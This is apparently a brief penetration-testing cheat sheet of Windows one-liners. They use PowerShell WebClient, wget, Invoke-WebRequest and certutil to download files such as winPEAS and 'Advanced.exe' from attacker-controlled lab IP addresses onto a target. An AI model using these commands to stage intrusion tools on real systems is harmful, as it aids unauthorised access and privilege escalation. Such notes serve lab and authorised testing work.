# Windows (downloading)

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.7:8888/winPEAS.bat', 'win.bat')
```

```
powershell -c wget "http://10.11.1.198/Advanced.exe" -outfile Advanced.exe
```

```
powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://10.11.17.48/winPEAS.exe"
```

```
certutil.exe -urlcache -split -f http://10.11.14.106:80/Advanced.exe
```
